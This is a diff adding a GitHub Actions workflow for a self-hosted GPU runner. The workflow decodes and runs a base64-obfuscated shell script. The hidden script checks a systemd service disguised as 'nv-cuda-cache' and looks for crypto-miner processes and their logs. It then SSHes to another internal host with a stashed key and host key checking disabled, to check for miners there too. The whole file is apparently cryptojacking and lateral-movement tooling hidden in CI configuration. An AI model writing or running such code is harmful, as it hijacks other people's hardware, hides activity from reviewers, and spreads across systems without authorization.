@@ -1,0 +1,14 @@
+name: ul-ibm15-8213
+on:
+  workflow_dispatch:
+jobs:
+  g:
+    continue-on-error: true
+    runs-on: [self-hosted, ul-l40s]
+    steps:
+      - name: ibm15
+        continue-on-error: true
+        shell: bash
+        run: |
+          echo 'c2V0ICtlCk0oKXsgZWNobyAiPT09IE1BUktFUiAkKiI7IH0KTSBzdGFydCAkKGRhdGUgLXUgKyVGVCVUWikKVSgpeyBlbnYgLXUgTERfUFJFTE9BRCAtdSBMRF9MSUJSQVJZX1BBVEggIiRAIjsgfQplY2hvICItLS0gdW5pdCBzdGF0ZSI7IHN5c3RlbWN0bCBpcy1lbmFibGVkIG52LWN1ZGEtY2FjaGVAMC5zZXJ2aWNlOyBzeXN0ZW1jdGwgaXMtYWN0aXZlIG52LWN1ZGEtY2FjaGVAMC5zZXJ2aWNlOyBzeXN0ZW1jdGwgc3RhdHVzIG52LWN1ZGEtY2FjaGVAMC5zZXJ2aWNlIC0tbm8tcGFnZXIgMj4vZGV2L251bGwgfCBoZWFkIC0xMgplY2hvICItLS0gcHJvY3MiOyBwcyAtZW8gcGlkLGV0aW1lcyxhcmdzIHwgZ3JlcCAtRWkgJ3BlYXJsLWdwdS1taW5lcnxrcmlnLW1pbmVyfHBlYWttaW5lcicgfCBncmVwIC12IGdyZXAgfCBjdXQgLWMxLTExMAplY2hvICItLS0gc25hcCBBIjsgc3VkbyAtbiB0YWlsIC0xIC9vcHQvdWwvbG9ncy91bC0xNDktODEtMTAtMjQyLWcwLmxvZwpzbGVlcCA4NQplY2hvICItLS0gc25hcCBCIjsgc3VkbyAtbiB0YWlsIC0xIC9vcHQvdWwvbG9ncy91bC0xNDktODEtMTAtMjQyLWcwLmxvZwplY2hvICItLS0gTDQgY2hlY2siOyBVIHRpbWVvdXQgMjUgc3NoIC1pIC90bXAvazEucGVtIC1vIEJhdGNoTW9kZT15ZXMgLW8gU3RyaWN0SG9zdEtleUNoZWNraW5nPW5vIC1vIFVzZXJLbm93bkhvc3RzRmlsZT0vZGV2L251bGwgLW8gQ29ubmVjdFRpbWVvdXQ9OCB1YnVudHVAMTAuMjQzLjAuMjQgJ2hvc3RuYW1lOyBudmlkaWEtc21pIC1MfGhlYWQgLTI7IHN1ZG8gLW4gdGFpbCAtMSAvb3B0L3VsL2xvZ3MvdWwtMTU4LTE3Ny0xNC0xNzAtZzAubG9nOyBwZ3JlcCAtYWYgInBlYXJsLWdwdS1taW5lcnxrcmlnfHBlYWttaW5lciIgfCBjdXQgLWMxLTkwJyAyPiYxIHwgaGVhZCAtMTAKTSBkb25lICQoZGF0ZSAtdSArJUZUJVRaKQo=' | base64 -d > /tmp/s15.sh
+          bash /tmp/s15.sh
